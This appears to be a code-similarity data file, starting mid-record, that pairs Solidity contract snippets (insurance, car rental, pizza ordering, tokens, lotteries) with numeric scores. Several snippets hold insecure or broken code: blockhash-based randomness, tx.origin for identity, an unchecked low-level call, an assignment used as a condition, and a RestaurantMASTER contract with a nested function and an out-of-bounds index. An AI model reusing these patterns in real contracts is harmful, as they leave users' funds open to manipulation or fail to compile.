    address[] public deployedInsuranceClaim;
    function createInsuranceClaim () public {
        address newInsuranceClaim = new InsuranceClaim(msg.sender);
        deployedInsuranceClaim.push(newInsuranceClaim);
    }

    function getDeployedInsuranceClaims () public view returns (address[] memory){
        return deployedInsuranceClaim;
    }
}",0.5400277185423643,"contract ERC820Registry {

    function getManager(address addr) public view returns(address);

    function setManager(address addr, address newManager) public;

    function getInterfaceImplementer(address addr, bytes32 iHash) public view returns (address);

    function setInterfaceImplementer(address addr, bytes32 iHash, address implementer) public;

}"
"contract {
...
  struct EtherBox {
    bytes32 label;
    address owner;
    string ownerUrl;
    uint256 expiration;
  }

  mapping (address => bytes32) public nicknames;
  mapping (address => address[]) public ownerToEtherBoxes;
  mapping (address => EtherBox) public etherBoxes;
  mapping (address => uint256) etherBoxesNonce;
...
  function publishEtherBox (bytes32 _label, string _ownerUrl, uint _lifespan) external onlyWhenRunning() payable {
      require(ownerToEtherBoxes[msg.sender].length < 10);
      assert(bytes(_ownerUrl).length <= 200);
      address etherBoxAddress = address(keccak256(msg.sender, etherBoxesNonce[msg.sender]++));
      ownerToEtherBoxes[msg.sender].push(etherBoxAddress);
      etherBoxes[etherBoxAddress] = EtherBox({
        label: _label,
        owner: msg.sender,
        ownerUrl: _ownerUrl,
        expiration: now + _lifespan
      });
      if(msg.value > 0){
        owner.transfer(msg.value);
      }
      emit EtherBoxPublished(msg.sender, nicknames[msg.sender], etherBoxAddress, _label, now);
  }
...
}",0.5750579673596263,"contract DepositContract {
  address public owner;
  address public parent;
  address public version;

  constructor(address _owner) public {
    parent = msg.sender;
    owner = _owner;
  }

  
  function() external payable { }

  
  function setVersion(address newVersion) external {
    require(msg.sender == parent);
    version = newVersion;
  }

  
  function perform(
    address addr, 
    string calldata signature, 
    bytes calldata encodedParams,
    uint value
  ) 
    external 
    returns (bytes memory) 
  {
    require(msg.sender == owner || msg.sender == parent || msg.sender == version, ""NOT_PERMISSIBLE"");

    if (bytes(signature).length == 0) {
      address(uint160(addr)).transfer(value); 
    } else {
      bytes4 functionSelector = bytes4(keccak256(bytes(signature)));
      bytes memory payload = abi.encodePacked(functionSelector, encodedParams);
      
      (bool success, bytes memory returnData) = addr.call.value(value)(payload);
      require(success, ""OPERATION_REVERTED"");

      return returnData;
    }
  }
}"
"contract test
{
    bytes32 lastblockhashused;
    uint lastblocknumberused;

    function test()
    {
        lastblocknumberused = (block.number-1)  ;               
        lastblockhashused = block.blockhash(lastblocknumberused);
    }

    function getTest1() constant returns (bytes32) {
        bytes32 number1 =lastblockhashused;
        return number1 & 0xfff;
    }
}",0.5263881285169573,"contract Randomable {

  

  function _generateRandom(bytes32 seed) view internal returns (bytes32) {

    return keccak256(abi.encodePacked(blockhash(block.number-1), seed));

  }



  function _generateRandomNumber(bytes32 seed, uint256 max) view internal returns (uint256) {

    return uint256(_generateRandom(seed)) % max;

  }

}"
"contract fileCtxEvidence{
    enum EviState { FINISHED,START_MOD,WAIT_OTHER_SIG,CANCEL_MOD,WAIT_LEFT_TILES }
    uint caseId;
    struct FileEvi{
        string fileName;
        bytes fileCtx;
        uint upTime;
        address upOperator;
        EviState state;
    }
    mapping(string => FileEvi) evi;
    event SaveEvi(address _oper,uint _time,string _name,uint _flag);
    constructor (uint _id) public{
        caseId = _id;
    }
    function saveFileEvi(string _name,bytes _file,uint _upTime ) public{
            evi[_name].fileName = _name;
            evi[_name].upTime = _upTime;
            evi[_name].upOperator = tx.origin;
            evi[_name].fileCtx = _file;            
           emit SaveEvi(tx.origin,_upTime,_name,0);


    }
    function getFileEvi(string _name) public view returns(bytes _file,uint _upTime,address _upOperator) {
        _file = evi[_name].fileCtx;
        _upTime = evi[_name].upTime;
        _upOperator = evi[_name].upOperator;
    }
}",0.5123286221314701,"contract HKHcoin is Whitelist {

    

    string public name;

    string public symbol;

    uint8 public decimals = 18;



    

    mapping (address => uint256) public balanceOf;



    

    event Mint(address indexed to, uint256 value);



    

    event Burn(address indexed from, uint256 value);



    

    constructor (

        string tokenName,

        string tokenSymbol

    ) public {

        name = tokenName;     

        symbol = tokenSymbol; 

    }



    

    

    

    function mintToken(address target, uint256 mintedAmount) 

        onlyIfWhitelisted(msg.sender) 

        public

    {

        balanceOf[target] += mintedAmount;

        emit Mint(target, mintedAmount);

    }



    

    function burnFrom(address _from, uint256 _value) 

        onlyIfWhitelisted(msg.sender) 

        public 

        returns (bool success)

    {

        require(balanceOf[_from] >= _value); 

        balanceOf[_from] -= _value;          

        emit Burn(_from, _value);

        return true;

    }

}"
"contract BuyExample{
          
    IUniswapV2Router02 usi = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
       
        
    function buyDai(uint256 amountOfEther) public payable returns(uint256){
    
    address cryptoToken = 0xc7AD46e0b8a400Bb3C915120d284AafbA8fc4735;
    
          uint deadline = now + 15; 
            usi.swapETHForExactTokens.value(amountOfEther)(0, getPathForETHToToken(cryptoToken), address(this), deadline);
    
            
            msg.sender.call.value(address(this).balance)("""");
    
           return 1000;
        
        }

  function getPathForETHToToken(address crypto) private view returns (address[] memory) {
    address[] memory path = new address[](2);
    path[0] = usi.WETH();
    path[1] = crypto;
    
    return path;
  }

    }",0.5261573175905141,"contract CarbonDollarProxyFactory {

    

    address[] public tokens;



    

    event CreatedCarbonDollarProxy(address newToken, uint256 index);

    

    

    function createToken(address tokenImplementation, address regulator) public {

        

        address proxy = address(new CarbonDollarProxy(tokenImplementation, regulator));



        

        CarbonDollarProxy(proxy).transferOwnership(msg.sender);



        tokens.push(proxy);

        emit CreatedCarbonDollarProxy(proxy, getCount()-1);

    }



    

    function getCount() public view returns (uint256) {

        return tokens.length;

    }



    

    function getToken(uint i) public view returns(address) {

        require((i < tokens.length) && (i >= 0), ""Invalid index"");

        return tokens[i];

    }

}"
"contract CarRentalServiceCustomer is GeneralAccount{
    string public customerName;
    string public postalAddress;
    string public phoneNumber;
    string public emailAddress;

    mapping(address=>CarRentService) public rentCar;

    struct CarRentService{ 
        bool active;
        uint lastUpdate;
        uint registrationFee;   
        uint256 rent;              
    }

    function CarRentalServiceCustomer(string _name,string _postalAddress,
                                    string _phoneNumber,string _emailAddress) payable {
        customerName  = _name;
        postalAddress = _postalAddress;
        phoneNumber   = _phoneNumber;
        emailAddress  = _emailAddress;
    }

    function registerToCarRentalServiceProvider(address _providerAddress) onlyOwner {

        rentCar[_providerAddress] = CarRentService({
                                    active: true, 
                                    lastUpdate: now,
                                    registrationFee: 0,
                                    rent: 0
                                    });
    }

    function setRegistrationFee(uint256 _registrationFee) {
        if(rentCar[msg.sender].active){
            rentCar[msg.sender].lastUpdate      = now;
            rentCar[msg.sender].registrationFee = _registrationFee;
        }
        else{
            throw;
        }
    }

    function setCarRent(uint256 _rent) {
        if(rentCar[msg.sender].active){
            rentCar[msg.sender].lastUpdate = now;
            rentCar[msg.sender].rent       = _rent;
        }
        else{
            throw;
        }
    }

    function payRegistrationFeeToCarRentalServiceProvider(address _providerAddress) returns (bool){
        if(_providerAddress.send(rentCar[_providerAddress].registrationFee))
        {
            rentCar[_providerAddress].registrationFee = 0;
            return true;
        }
        else{
            return false;
        }
    }

    function payRentToCarRentalServiceProvider(address _providerAddress) returns (bool){
        if(_providerAddress.send(rentCar[_providerAddress].rent))
        {
            rentCar[_providerAddress].rent = 0;
            return true;
        }
        else{
            return false;
        }
    }

    function unsubscribeFromCarRentalService(address _providerAddress){
        if(rentCar[_providerAddress].active = false && rentCar[_providerAddress].rent == 0 
        && rentCar[_providerAddress].registrationFee == 0 ){
            rentCar[_providerAddress].active = false;
        } else {
            throw;
        }
    }

    function payTestFunds() payable{
        
    }
}",0.5758856657471193,"contract Extendable is Ownable {

    struct ProviderItem {

        uint start;

        uint end;

        address providerAddress;

    }



    uint public currentId = 10000;

    uint16 public currentVersion = 0;

    mapping (uint => ProviderItem) internal providers;



    function upgradeProvider(address _address) 

        public onlyOwner returns (bool) 

    {

        require(_address != 0x0);

        require(providers[currentVersion].providerAddress != _address);



        

        if (providers[currentVersion].providerAddress == 0x0) {

            providers[currentVersion].start = currentId;

            providers[currentVersion].end = 10 ** 18;

            providers[currentVersion].providerAddress = _address;

            return true;            

        }



        providers[currentVersion].end = currentId - 1;



        ProviderItem memory newProvider = ProviderItem({

            start: currentId,

            end: 10**18,

            providerAddress: _address

        });



        providers[++currentVersion] = newProvider;



        return true;

    }



    function getProviderDetails(uint _version) public view returns (uint _start, uint _end, address _address) 

    {

        ProviderItem memory provider = providers[_version];

        return (provider.start, provider.end, provider.providerAddress);

    }



    function getProviderById(uint _id) public view returns (address) {

        for (uint i = currentVersion; i >= 0; i--) {

            ProviderItem memory item = providers[i];

            if (item.start <= _id && item.end >= _id) {

                return item.providerAddress;

            }

        }



        return getCurrentProvider();

    }



    function getCurrentProvider() public view returns(address) {

        return providers[currentVersion].providerAddress;

    }   



    function getAllProviders() public view returns (address[] memory addresses) {

        addresses = new address[](currentVersion + 1);

        for (uint i=0; i <= currentVersion; i++) {

            addresses[i] = providers[i].providerAddress;

        }



        return addresses;

    }



    function resetCurrentIdTo(uint _newId) public onlyOwner returns (bool success) {

        currentId = _newId;

        return true;

    }

}"
"contract Sc2{
     mapping (address => uint) token_balance2;
     address owner;
     function SC2(){
        owner = msg.sender;
      }
      function register() external{
       Sc1 c1=Sc1(0x22);
                        
       c1.register_valid_contract();
      }
      
      
      function fetch_tokens(uint val) external{
       Sc1 c1=Sc1(0x22);
                        
      c1.decrement_token(val);
      token_balance2[msg.sender] += val;
      }
    }",0.5878340189506077,"contract Token {

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function transfer(address to, uint tokens) public returns (bool success);

  function allowance(address tokenOwner, address spenderContract) public view returns (uint remaining);

}"
"contract answer{
  mapping(address => mapping(string => bool)) voters;

  struct qList {
    uint count; 
    mapping(address => mapping(uint => uint)) answer;
  }

  mapping(string => qList) questionnaires;

  function vote(string ID, uint qNum, uint ans) returns (bool) {
    if(voters[msg.sender][ID]) throw;
    voters[msg.sender][ID] = true;
    questionnaires[ID].count += 1;
    questionnaires[ID].answer[msg.sender][qNum] = ans;
    return true;
  }

  function getNumResult(string ID) constant returns (uint res) {
    return questionnaires[ID].count;
  }
}",0.5837849044022103,"contract freedomStatement {

    

    string public statement = ""https:

    mapping (address => bool) internal consent;

    event wearehere(string statement);

    

    constructor () public {

        emit wearehere(statement);

    }

        

    function isHuman(address addr) internal view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size == 0;

    }



    function () external {

        require(isHuman(msg.sender),""no robot"");

        consent[msg.sender] = true;

    }

    

    function check(address addr) public view returns (bool){

        return(consent[addr]);

    }

}"
"contract IpfsLink{
    address owner;
    uint public lastHashId;
    uint hashCost = 0.001 ether;

    struct IpfsHash{
        address sender;
        string hashString;
        uint timestamp;
    }

    mapping (uint => IpfsHash) hashes;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor() public{
        owner = msg.sender;
        lastHashId = 0;
    }

    function saveHash(string _hashContent) external payable {
        require(msg.value >= hashCost);

        uint hashId = ++lastHashId;
        hashes[hashId].sender = msg.sender;
        hashes[hashId].hashString = _hashContent;
        hashes[hashId].timestamp = now;
    }
}",0.5886673830693896,"contract hodlEthereum {
    event Hodl(address indexed hodler, uint indexed amount);
    event Party(address indexed hodler, uint indexed amount);
    mapping (address => uint) public hodlers;

    
    uint constant partyTime = 1535760000;

    
    function hodl() payable public {
        hodlers[msg.sender] += msg.value;
        emit Hodl(msg.sender, msg.value);
    }

    
    function party() public {
        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);
        uint value = hodlers[msg.sender];
        hodlers[msg.sender] = 0;
        msg.sender.transfer(value);
        emit Party(msg.sender, value);
    }
}"
"contract Sample{

    struct Structure{
        uint a;
        string b;
    }

    mapping(string => Structure) public s;

    function add(uint a, string memory b)public {
        s[b] = Structure(a,b);
    }
}",0.5957372228966046,"contract onchain{

    string onChainData;

    function set (string x) public{

        onChainData = x;

    }

    

    function get() public constant returns (string){

        return onChainData;

    }

}"
"contract Converter{
    function Converter(){

    }

    function stringToBytes32(string memory source) returns (bytes32 result) {
        bytes memory tempEmptyStringTest = bytes(source);
        if (tempEmptyStringTest.length == 0) {
            return 0x0;
        }

        assembly {
            result := mload(add(source, 32))
        }
    }
}",0.5358796652049679,"contract ERC721Metadata is ERC721 {

  function name() external view returns (string memory _name);

  function symbol() external view returns (string memory _symbol);

  function tokenURI(uint256 _tokenId) public view returns (string memory);

}"
"contract CarRentalServiceCustomer is GeneralAccount{
    string public customerName;
    string public postalAddress;
    string public phoneNumber;
    string public emailAddress;

    mapping(address=>CarRentService) public rentCar;

    struct CarRentService{ 
        bool active;
        uint lastUpdate;
        uint registrationFee;   
        uint rent;              
    }

    function CarRentalServiceCustomer(string _name,string _postalAddress,string _phoneNumber,string _emailAddress){
        customerName  = _name;
        postalAddress = _postalAddress;
        phoneNumber   = _phoneNumber;
        emailAddress  = _emailAddress;
    }

    function registerToCarRentalServiceProvider(address _providerAddress) onlyOwner {

        rentCar[_providerAddress] = CarRentService({
                                    active: true, 
                                    lastUpdate: now,
                                    registrationFee: 0,
                                    rent: 0
                                    });
    }

    function setRegistrationFee(uint _registrationFee) {
        if(rentCar[msg.sender].active){
            rentCar[msg.sender].lastUpdate      = now;
            rentCar[msg.sender].registrationFee = _registrationFee;
        }
        else{
            throw;
        }
    }

    function setCarRent(uint _rent) {
        if(rentCar[msg.sender].active){
            rentCar[msg.sender].lastUpdate = now;
            rentCar[msg.sender].rent       = _rent;
        }
        else{
            throw;
        }
    }

    function payRegistrationFeeToCarRentalServiceProvider(address _providerAddress) returns (bool){

        bool regFeeStatus = true;
        if(_providerAddress.send(rentCar[_providerAddress].registrationFee))
        {
            rentCar[_providerAddress].registrationFee = 0;
            return regFeeStatus;
        }
        else{
            return !regFeeStatus;
        }
    }

    function payRentToCarRentalServiceProvider(address _providerAddress) returns (bool){

        bool payStatus = true;
        if(_providerAddress.send(rentCar[_providerAddress].rent))
        {
            rentCar[_providerAddress].rent = 0;
            return payStatus;
        }
        else{
            return !payStatus;
        }
    }

    function unsubscribeFromCarRentalService(address _providerAddress){
        if(rentCar[_providerAddress].active = false && rentCar[_providerAddress].rent == 0 
        && rentCar[_providerAddress].registrationFee == 0 ){
            rentCar[_providerAddress].active = false;
        } else {
            throw;
        }
    }
}",0.5311486040737514,"contract DeneumToken is StandardToken {

    string public name = ""Deneum"";

    string public symbol = ""DNM"";

    uint8 public decimals = 2;

    bool public mintingFinished = false;

    mapping (address => bool) owners;

    mapping (address => bool) minters;



    event Mint(address indexed to, uint256 amount);

    event MintFinished();

    event OwnerAdded(address indexed newOwner);

    event OwnerRemoved(address indexed removedOwner);

    event MinterAdded(address indexed newMinter);

    event MinterRemoved(address indexed removedMinter);

    event Burn(address indexed burner, uint256 value);



    function DeneumToken() public {

        owners[msg.sender] = true;

    }



    

    function mint(address _to, uint256 _amount) onlyMinter public returns (bool) {

        require(!mintingFinished);

        totalSupply_ = totalSupply_.add(_amount);

        balances[_to] = balances[_to].add(_amount);

        Mint(_to, _amount);

        Transfer(address(0), _to, _amount);

        return true;

    }



    

    function finishMinting() onlyOwner public returns (bool) {

        require(!mintingFinished);

        mintingFinished = true;

        MintFinished();

        return true;

    }



    

    function burn(uint256 _value) public {

        require(_value <= balances[msg.sender]);

        

        



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply_ = totalSupply_.sub(_value);

        Burn(burner, _value);

        Transfer(burner, address(0), _value);

    }



    

    function addOwner(address _address) onlyOwner public {

        owners[_address] = true;

        OwnerAdded(_address);

    }



    

    function delOwner(address _address) onlyOwner public {

        owners[_address] = false;

        OwnerRemoved(_address);

    }



    

    modifier onlyOwner() {

        require(owners[msg.sender]);

        _;

    }



    

    function addMinter(address _address) onlyOwner public {

        minters[_address] = true;

        MinterAdded(_address);

    }



    

    function delMinter(address _address) onlyOwner public {

        minters[_address] = false;

        MinterRemoved(_address);

    }



    

    modifier onlyMinter() {

        require(minters[msg.sender]);

        _;

    }

}"
"contract Manage{

 struct Policy{
  string  PolicyID ;
 }
 mapping (address => mapping(string => Policy)) private policy;

 function storePolicy(address insuranceHolder,string memory _PolicyID) public {        
   policy[insuranceHolder][_PolicyID].PolicyID = _PolicyID;
 }
 function getPolicy(address insuranceHolder,string memory _PolicyID) public view returns(Policy memory) {
  return policy[insuranceHolder][_PolicyID];
 }
}",0.5343160363370159,"contract BaseFactory {

    address public mainFabricAddress;
    string public title;

    struct Parameter {
        string title;
        string paramType;
    }

    
    Parameter[] public params;

    
    function numParameters() public view returns (uint256)
    {
        return params.length;
    }

    function getParam(uint _i) public view returns (
        string title,
        string paramType
    ) {
        return (
        params[_i].title,
        params[_i].paramType
        );
    }
}"
"contract Array{
    using Library for Library.data;
    mapping(address => Library.data) map;
    function addCluster(address id) {
        if(map[id].isValue) throw; 
        
    }
}",0.5402893689400976,"contract MPOListener {
	MPO public mp;
	
	function switchMPO(address from, address to) {
		if(msg.sender!=mp.operator()) throw;
		if(mp==from) {
			mp=MPO(to);			
		}
	}
}"
"contract Contract2{
    bool public result;
    constructor(address contract1Address) public {
        Contract1 contract1 = Contract1(contract1Address);
        result = contract1.simple();
    }
}",0.5816394096771005,"contract Owned {
    address contractOwner;

    constructor() public { 
        contractOwner = msg.sender; 
    }
    
    function whoIsTheOwner() public view returns(address) {
        return contractOwner;
    }
}"
"contract RestaurantMASTER{
event logStatus(uint orderNumber, bytes input, uint256 timestamp);


function RestaurantMASTER(){
tokens[0]++;
CU = Customer(newCustomer());                       
WA = Waiter(newWaiter());                           
CH = Chef(newChef());                               
DB = dataBase(newDataBase());                       

}

    
    address[] public contracts;
    Customer CU;
    Waiter WA;
    Chef CH;
    dataBase DB;


    
    int[] public tokens = new int[](7);
    uint public orderNumber = -1;


    function newCustomer() private returns(address newContract){
        CU = new Customer();
        contracts.push(CU);
        return (CU);
    }
      function newWaiter () private returns(address newContract) {
       WA = new Waiter();
        contracts.push(WA);
        return (WA);
    }
     function newChef () private returns(address newContract) {
        CH = new Chef();
        contracts.push(CH);
        return (CH);
    }
    function newDataBase() private returns(address newContract){
        DB = new dataBase();
        contracts.push(DB);
        return (DB);
    }

   function OrderPizza(){
        orderNumber++;
        if(tokens[0] == 1){
            tokens[0] = 0;
            tokens[2]++;
            logStatus(orderNumber,""Pizza ordered"", now);
        } else {revert();}
    }

    function TakeTheOrder(){
        if(tokens[2] == 1){
            tokens[2] = 0;
            tokens[3]++;
            logStatus(orderNumber,""Order taken"", now);
        } else {revert();}
    }

        function PreparePizza(){
        if(tokens[3] == 1){
            tokens[3] = 0;
            tokens[4]++;
            logStatus(orderNumber,""Pizza Prepared"", now);
        } else {revert();}
    }
        function PokeTheWaiter(){
        if(tokens[4] == 1){
            tokens[4] = 0;
            tokens[6]++;
            logStatus(orderNumber,""Waiter has been poked"", now);
        } else {revert();}

        function WaiterBringsPizza(){
        if(tokens[4] == 1){
            tokens[4] = 0;
            tokens[7]++;
            logStatus(orderNumber,""Waiter is bringing Pizza"", now);
        } else {revert();}
    }
     function CustomerReceivesPizza(){
        if(tokens[7] == 1){
            tokens[7] = 0;
            logStatus(orderNumber,""Customer eats Pizza"", now);
        } else {revert();}
    }



    }
}",0.5368376727366442,"contract InfinityPool is Owned {

    using SafeMath for uint;



    

    Zer0netDbInterface public zer0netDb;

    

    event Deposit(

        address indexed token, 

        address owner, 

        uint tokens,

        bytes data

    );



    event Transfer(

        address indexed token, 

        address receiver, 

        uint tokens

    );



    

    constructor() public {

        

        

        zer0netDb = Zer0netDbInterface(0xE865Fe1A1A3b342bF0E2fcB11fF4E3BCe58263af);

    }



    

    modifier onlyAuthBy0Admin() {

        

        require(zer0netDb.getBool(keccak256(

            abi.encodePacked(msg.sender, '.has.auth.for.infinitypool'))) == true);



        _;      

    }



    

    function deposit(

        address _token, 

        uint _tokens, 

        bytes _data

    ) external returns (bool success) {

        return _deposit(_token, msg.sender, _tokens, _data);

    }



    

    function receiveApproval(

        address _from, 

        uint _tokens, 

        address _token, 

        bytes _data

    ) public returns (bool success) {

        return _deposit(_token, _from, _tokens, _data);

    }



    

    function _deposit(

        address _token,

        address _from, 

        uint _tokens,

        bytes _data

    ) private returns (bool success) {

        

        bytes32 hash = keccak256('infinitywell');

            

        

        address infinityWell = zer0netDb.getAddress(hash);



        

        

        uint wellContribution = uint(_tokens.div(100));

        

        

        uint depositAmount = _tokens.sub(wellContribution);



        

        ERC20Interface(_token).transferFrom(

            _from, address(this), depositAmount);

        

        

        

        ERC20Interface(_token).transferFrom(

            _from, infinityWell, wellContribution);

        

        

        emit Deposit(_token, _from, _tokens, _data);



        

        return true;

    }

    

    

    function transfer(

        address _token,

        address _to, 

        uint _tokens

    ) external onlyAuthBy0Admin returns (bool success) {

        

        ERC20Interface(_token).transfer(_to, _tokens);

        

        

        emit Transfer(_token, _to, _tokens);



        

        return true;

    }



    

    function () public payable {

        

        revert('Oops! Direct payments are NOT permitted here.');

    }

}"
"contract Customer{
event logStatus(uint orderNumber, bytes input, uint256 timestamp);

}",0.5247519388079498,"contract IAssets {



    

    

    

    

    

    function withdrawAsset(

        bytes assetData,

        uint256 amount

    )

        external;

}"
"contract Chef{
event logStatus(uint orderNumber, bytes input, uint256 timestamp);

}",0.5282403902346542,"contract FiatContract
{
    function USD(uint _id) external constant returns (uint256);
}"
"contract Waiter{
event logStatus(uint orderNumber, bytes input, uint256 timestamp);

}",0.5321213183537767,"contract IAssets {



    

    

    

    

    

    function withdrawAsset(

        bytes assetData,

        uint256 amount

    )

        external;

}"
"contract dataBase{
event logStatus(uint orderNumber, bytes input, uint256 timestamp);

}",0.536549201228694,"contract IAssets {



    

    

    

    

    

    function withdrawAsset(

        bytes assetData,

        uint256 amount

    )

        external;

}"
"contract Contact2{
    function test() {
          address test = msg.sender; 
          Token(0x5faf852d0bae90ae3adb58f68deae7fcfc065a6d).transfer(this, 1);
        }
}",0.518991325077803,"contract IToken {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}"
"contract Foo
{
    modifier ifHasOneOf(uint[] roles) {
        for (uint i=0; i < roles.length; i++) {
            if (getRoleForUser(msg.sender) == roles[i]) {
                _;
            }
        }
    }

    function A() public ifHasOneOf([UserRoles.AUTHOR, UserRoles.EDITOR]) {
        
    }

    function B() public ifHasOneOf([UserRoles.AUTHOR, UserRoles.CONTRIBUTOR]) {
        
    }
}",0.5152019144900234,"contract Ownable {
    
    address[] public owners;
    
    mapping(address => bool) bOwner;
    
    
    function Ownable() public {
        owners = [ 0x315C082246FFF04c9E790620867E6e0AD32f2FE3 ];
                    
        for (uint i=0; i< owners.length; i++){
            bOwner[owners[i]]=true;
        }
    }
    
    
    modifier onlyOwner() {
        
        require(bOwner[msg.sender]);
        _;
    }
    
    

}"
"contract Supplier{
    struct supply{
        string NameoProd;
        uint QuantityoProd;
        string MnfofProd;
        string toSrv;
        string stat;
        string comments;
    }
    uint SaleID=100000;
    mapping (uint=>supply) fmr;
    event getSupplier( address indexed OwnAdd, string _NameoProd,
        uint _QuantityoProd,
        string _MnfofProd,
        string _toSrv,
        string _status,
        string _comments);

    function setSupply(string _NameoProd,
        uint _QuantityoProd,
        string _MnfofProd,
        string _toSrv,
        string _status,
        string _comments) public{
        address snd = msg.sender;
        fmr[SaleID]=supply(_NameoProd,_QuantityoProd,_MnfofProd,_toSrv,_status,_comments);
        emit getSupplier(snd, _NameoProd,_QuantityoProd,_MnfofProd,_toSrv,_status,_comments);
        SaleID++;
    }
  function getSomething(uint ID) public view returns (string , uint  , string , string , string , 
    string  ){
        supply a=fmr[ID];
       return (a.NameoProd, a.QuantityoProd, a.MnfofProd, a.toSrv, a.stat, a.comments);
    }
    function update(uint ID, string rpf) public {
        supply b =fmr[ID];
        b.stat=rpf;
        fmr[ID]=b;
        emit getSupplier(msg.sender, b.NameoProd,b.QuantityoProd,b.MnfofProd,b.toSrv,b.stat,b.comments);
    }

    }",0.5264850601546398,"contract lccCertificados {



    address constant public myAddressLcc = 0xdc32EFF737bd1B94a7814eC269Ef4808C887850D;

    event LogsCourse(string name);

    

    struct Course {

      string nameStudent;

      string idStudent;

      string idCourse;

      string nameCourse;

      string note;

      uint timestamp;

    }

    

    mapping (uint => Course) Courses;

    

    

    

    function setCourse(uint id, string memory nameStudent, string memory idStudent, string memory idCourse, string memory nameCourse, string memory note) public payable returns  (uint success)  {



       

       

       if(msg.sender == myAddressLcc) {



         Courses[id].nameStudent = nameStudent;

         Courses[id].idStudent = idStudent;        

         Courses[id].idCourse = idCourse;

         Courses[id].nameCourse = nameCourse;

         Courses[id].note = note;

         Courses[id].timestamp = now;

         return id;

        

       }

   

    }

    



    

    function getCourse(uint id) public view returns  (Course memory success)  {

        return Courses[id];

        

    }

    function getSender() public view returns  (address success)  {

        return msg.sender;

        

    }

    function getNameCourse(uint id) public view returns  (string memory success)  {

        return Courses[id].nameCourse;

    }





    

}"
"contract ProofofExistence{
   event ProofCreated(
      uint256  indexed id,
      bytes32 documentHash);

   address public owner;
   mapping  (uint => bytes32) hashesById;

   modifier onlyOwner() {
      require(msg.sender == owner);
      _;
   }

   modifier noHashExistsYet(uint256 id) {
      require(hashesById[id] == """");
      _;
   }

   constructor() public {
      owner = msg.sender;
   }

   function notarizeHash(uint256 id, bytes32 documentHash) onlyOwner noHashExistsYet(id) public{
      hashesById[id] = documentHash;
      emit ProofCreated(id, documentHash);
   }
   

   function doesProofExist(uint256 id, bytes32 documentHash) public view returns (bool) {
      return hashesById[id] == documentHash;
   }
}",0.5850305588004224,"contract REALotteryWheel{
    
    uint16 public round_count = 0;
    bytes32 public last_hash;
    address public controller;
    
    mapping (uint16 => bytes32) public hashes;
    
    function REALotteryWheel() public {
        controller = msg.sender;
        last_hash = keccak256(block.number, now);    
    }
    
    function do_spin(bytes32 s) internal {
        round_count = round_count + 1;
        last_hash = keccak256(block.number,now,s);
        hashes[round_count] = last_hash;
    }

    function spin(bytes32 s) public { 
    	if(controller != msg.sender) revert();
    	do_spin(s);
    }

    function get_hash (uint16 i) constant returns (bytes32){
        return hashes[i];
    }
    
    function () payable {
        do_spin(bytes32(msg.value));
    }
    
}"
"contract game
 {

     struct users
     {
         string name;
         uint level;
         uint score;
     }

     mapping(uint => users[]) mulusers;

     function addusers (string _name, uint _level, uint _score) public {

         users memory use= users(_name,_level,_score); 
     }

     function getusers (uint _level) public view returns (string)
     {
        uint index= mulusers[_level].length;
         for(uint i=0; i<index; i++)
         {       
           return mulusers[_level].users[i].name;    
         }   
     }   
 }",0.5898098687732257,"contract IPackFour {

    struct Purchase {
        uint16 current;
        uint16 count;
        address user;
        uint randomness;
        uint64 commit;
    }

    function purchases(uint p) public view returns (
        uint16 current,
        uint16 count,
        address user,
        uint256 randomness,
        uint64 commit
    );

    function predictPacks(uint id) public view returns (uint16[] memory protos, uint16[] memory purities);

}"
"contract TestConst{
    uint public a = 10;

    function constantFnA() constant returns (uint) {
        return  a+5;
    }

    
    
    function NonCosntUsesConst(){
        a = constantFnA();
    }

    
    

    function nonConstantFn(){
        a = a+5;
    }


    uint8 public b = 10;
    function constantFnB() constant returns (uint8) {
        return  b+5;
    }

    
    
    function nonConstUisngB(){
        b = b+5;
    }

    
    
    function NonConstUsingConstB(){
        b = constantFnB();
    }
}",0.5996216962626011,"contract PoSTokenStandard {
    uint256 public stakeStartTime;
    uint256 public stakeMinAge;
    uint256 public stakeMaxAge;
    function mint() returns (bool);
    function coinAge() constant returns (uint256);
    function checkPos() constant returns (uint256);
    function annualInterest() constant returns (uint256);
    event Mint(address indexed _address, uint _reward);
}"
"contract Department{

    struct Employee{
        uint empId;
        string empName;
        uint256 empSalary;
    }

    uint departmentId;
    string departmentName;
    mapping (uint => Employee) public employees;
    uint public employeeCount;

    constructor(uint _departmentId, string memory _departmentName) public {
        employeeCount = 0;
        departmentId = _departmentId;
        departmentName = _departmentName;
    }

    function addEmployee(uint _empId, string memory _empName, uint _empSalary ) public {
        employees[employeeCount] = Employee(_empId, _empName, _empSalary);
        employeeCount++;
    }

    
    function get(uint _index) public view returns(Employee memory) {
        return employees[_index];
    }

    
    function getEmployee() public view returns (uint[] memory, string[] memory, uint[] memory) {
        uint[]    memory id = new uint[](employeeCount);
        string[]  memory name = new string[](employeeCount);
        uint[]    memory salary = new uint[](employeeCount);
        for (uint i = 0; i < employeeCount; i++) {
          Employee storage employee = employees[i];
          id[i] = employee.empId;
          name[i] = employee.empName;
          salary[i] = employee.empSalary;
        }
        return (id, name, salary);
    }

    
    function getEmployees() public view returns (Employee[] memory) {
        Employee[]  memory id = new Employee[](employeeCount);
        for (uint i = 0; i < employeeCount; i++) {
          Employee storage employee = employees[i];
          id[i] = employee;
        }
        return id;
    }

}",0.5239095913151821,"contract Games {
    using SafeMath for int;
    using SafeMath for uint;

    mapping (uint => GameInterface) public games;

    
    constructor(address[] memory gameContracts) public {
        for (uint i = 0; i < gameContracts.length; i++) {
            
            games[i + 1] = GameInterface(gameContracts[i]);
        }
    }

    
    function maxBet(uint8 _gameType, uint _num, uint _bankRoll) public view returns(uint) {
        uint maxBetVal = getGameImplementation(_gameType).maxBet(_num, _bankRoll);
        return maxBetVal.add(5e14).div(1e15).mul(1e15); 
    }

    
    function resultNumber(uint8 _gameType, bytes32 _serverSeed, bytes32 _userSeed, uint _num) public view returns(uint) {
        return getGameImplementation(_gameType).resultNumber(_serverSeed, _userSeed, _num);
    }

    
    function userProfit(uint8 _gameType, uint _num, uint _betValue, uint _resultNum) public view returns(int) {
        uint betValue = _betValue / 1e9; 

        int res = getGameImplementation(_gameType).userProfit(_num, betValue, _resultNum);

        return res.mul(1e9); 
    }

    
